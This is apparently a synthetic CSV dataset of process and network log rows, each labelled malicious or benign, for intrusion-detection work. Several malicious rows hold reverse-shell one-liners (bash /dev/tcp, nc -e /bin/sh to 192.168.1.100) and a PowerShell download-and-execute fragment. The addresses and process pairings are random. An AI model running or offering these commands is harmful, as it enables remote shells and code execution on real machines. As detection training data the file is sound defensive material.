timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-03-20 09:42:45.898036,d4b4f36c,init,chrome.exe,66.106.71.132,205.94.236.117,1337,UDP,3733,4584,40.84,"python -c 'import socket,subprocess'",1
2025-03-13 23:46:45.645535,68d22076,systemd,nc,237.20.91.135,73.163.2.23,3389,TCP,2266,950,36.99,ping,0
2025-03-29 22:05:45.538901,f63dbcc1,systemd,explorer.exe,149.37.225.223,145.95.74.158,443,UDP,108,2524,52.62,dir,0
2025-04-01 04:52:44.986497,b6536547,svchost.exe,nc,118.224.76.123,64.95.29.12,8080,UDP,2537,2483,15.7,ipconfig,0
2025-02-25 22:34:45.648934,719985f6,systemd,cmd.exe,118.69.252.20,130.86.129.45,443,TCP,1381,2525,7.38,ping,0
2025-03-15 01:23:46.095878,779bdd25,init,cmd.exe,161.66.59.69,254.146.28.157,1337,UDP,2680,4107,4.59,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-16 21:03:44.745093,fadd81b9,svchost.exe,explorer.exe,206.24.211.38,121.238.154.112,22,TCP,2205,1866,22.31,ipconfig,0
2025-03-23 22:10:45.442654,86f3b6f6,init,notepad.exe,80.161.194.38,26.45.199.192,1337,TCP,60,2280,0.5,ls,0
2025-03-10 01:10:45.685866,6bc5ec43,svchost.exe,svchost.exe,98.3.253.182,37.207.149.128,8080,TCP,511,3003,26.45,"python -c 'import socket,subprocess'",1
2025-03-25 22:12:45.061691,4e6b1d74,systemd,nc,245.168.69.134,217.245.187.28,3389,UDP,1602,1000,28.78,ipconfig,0
2025-03-21 20:33:46.013617,9dd9271e,init,notepad.exe,19.67.90.254,218.35.226.16,22,UDP,3263,1772,46.77,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-23 10:54:46.063917,1ade6c51,explorer.exe,chrome.exe,9.54.235.88,202.12.63.93,3389,TCP,3322,2143,22.12,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-16 15:12:45.996397,09edf103,svchost.exe,perl,139.139.182.83,241.253.14.167,8080,UDP,4690,1524,31.27,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-25 18:56:45.144523,2a43809c,systemd,cmd.exe,236.248.185.4,195.49.110.14,443,UDP,115,4473,8.54,ipconfig,0
2025-03-26 12:16:45.838911,b5045bc1,svchost.exe,notepad.exe,172.169.122.42,219.171.152.64,1337,TCP,1129,803,7.35,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-08 21:28:45.263819,f1d067f5,systemd,perl,187.158.238.220,44.13.23.44,1337,UDP,3977,3437,45.79,ls,0
2025-04-29 17:40:44.914228,5871c182,init,python.exe,91.138.35.212,174.35.108.37,443,TCP,3398,3819,22.46,dir,0
2025-02-25 14:40:44.931180,75d8a768,init,notepad.exe,101.220.116.54,56.100.18.69,443,UDP,3914,2350,5.16,ping,0
2025-04-08 04:17:45.081471,38e80007,explorer.exe,notepad.exe,196.17.98.43,57.4.253.7,443,TCP,292,2572,40.49,ls,0
2025-02-28 01:06:46.364757,dffde6b9,init,bash,73.28.118.196,118.101.137.206,443,UDP,4553,1902,16.04,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-05 17:47:46.385979,969f26f3,systemd,perl,195.50.111.122,118.219.120.136,8080,UDP,358,4687,8.43,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-24 01:03:44.988930,bf772e18,svchost.exe,cmd.exe,225.241.254.131,163.104.49.107,3389,TCP,4476,428,21.07,ping,0
2025-04-27 21:50:45.414103,cb83a27f,init,cmd.exe,253.132.47.197,107.201.197.170,1337,UDP,2310,2682,18.18,cd,0
2025-04-20 23:22:45.405951,8be4ff40,systemd,perl,202.32.25.136,224.173.79.141,4444,UDP,4715,2272,18.63,dir,0
2025-04-25 10:47:45.626399,9adb490d,systemd,nc,149.167.110.129,122.48.143.55,1337,TCP,4445,3855,40.3,ipconfig,0
2025-03-31 04:54:45.124503,19f86f28,explorer.exe,svchost.exe,22.133.76.192,203.128.102.43,3389,UDP,2173,4744,50.26,ipconfig,0
2025-04-10 22:07:46.242490,1990b811,init,bash,17.9.187.98,247.160.35.183,8080,TCP,1660,911,32.21,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-30 08:34:44.866719,f7648235,explorer.exe,explorer.exe,206.47.175.119,54.237.42.7,22,TCP,2976,1811,5.7,ping,0
2025-03-22 16:03:45.469601,99cbd91a,init,explorer.exe,132.18.204.222,101.191.56.67,8080,UDP,2002,318,19.42,ipconfig,0
2025-04-17 23:52:45.957990,b99a80fb,systemd,powershell,211.184.69.194,175.4.85.108,1337,UDP,2446,77,31.85,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-11 03:48:45.411254,427a571d,init,powershell,68.45.150.83,173.102.174.248,443,TCP,884,3528,54.04,ping,0
2025-04-21 23:55:45.919556,b438ddc1,svchost.exe,python.exe,29.113.88.164,175.180.4.6,3389,TCP,3283,879,49.99,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-15 14:55:46.197760,6bcd103f,svchost.exe,explorer.exe,3.36.82.134,247.231.213.74,4444,UDP,3539,2750,55.95,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-24 20:37:45.906647,4986fbc8,explorer.exe,python.exe,232.150.34.252,11.94.110.67,8080,UDP,2570,1155,31.15,"python -c 'import socket,subprocess'",1
2025-02-26 18:51:45.822974,4216eee9,init,explorer.exe,15.248.63.91,20.236.71.197,1337,TCP,94,3158,50.99,"python -c 'import socket,subprocess'",1
2025-04-03 16:10:45.208547,258cd93f,init,bash,189.211.53.132,106.242.53.109,22,UDP,4003,2499,28.5,dir,0
2025-04-09 15:21:45.994242,f27a335e,init,nc,240.233.204.93,116.235.208.197,3389,UDP,3017,157,44.43,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-26 17:32:45.447453,5b5001b1,init,chrome.exe,163.175.236.126,140.5.120.81,4444,UDP,676,3416,12.18,ipconfig,0
2025-03-04 07:00:46.243861,06f5c192,systemd,explorer.exe,235.195.169.135,207.235.153.171,3389,TCP,2424,382,23.08,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-05 03:42:44.755536,f7e93f2a,explorer.exe,powershell,166.32.165.144,22.50.245.159,3389,TCP,4721,4324,11.44,cd,0
2025-03-29 02:04:44.956626,5a53fe51,svchost.exe,cmd.exe,184.13.250.165,251.195.41.179,4444,UDP,1469,3556,2.54,cd,0
2025-03-09 00:44:45.942527,59b1af00,systemd,cmd.exe,137.197.209.233,41.45.73.168,4444,TCP,4323,243,32.41,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-11 15:33:45.729572,69b08883,explorer.exe,bash,215.228.202.46,124.102.112.69,3389,UDP,3763,4996,39.19,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-05-01 05:09:45.977476,842b697e,systemd,nc,132.75.116.229,205.136.180.220,8080,UDP,2092,1087,15.05,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-10 13:41:46.400033,b55e2e67,init,bash,33.9.204.175,28.50.127.9,4444,UDP,1750,2684,47.22,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 09:20:46.240395,146b3b5f,systemd,perl,187.185.59.101,41.36.188.141,8080,UDP,4474,3403,44.53,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-28 14:30:45.975709,006a1dd7,svchost.exe,python.exe,22.40.37.193,125.196.41.92,8080,TCP,4853,2374,20.06,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-10 01:33:45.278345,63d3b4e9,init,perl,46.239.213.33,152.155.92.68,443,TCP,4909,4229,31.1,ls,0
2025-04-21 13:58:46.004664,526b0327,explorer.exe,nc,192.144.100.171,141.84.14.118,8080,TCP,928,2396,50.19,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-27 11:59:45.401874,bbeaf12c,init,svchost.exe,17.208.81.1,246.79.25.253,8080,TCP,423,4827,42.88,ipconfig,0
2025-03-08 17:59:45.709739,3c5205ea,systemd,powershell,171.39.15.223,190.237.231.175,8080,TCP,4961,2147,7.19,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-09 20:52:45.330949,07b4e276,svchost.exe,powershell,159.7.66.243,167.100.39.127,22,UDP,1002,1770,43.47,ls,0
2025-03-19 15:29:46.012849,2e40632d,explorer.exe,notepad.exe,147.143.39.128,90.147.121.187,443,UDP,1813,4122,11.59,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
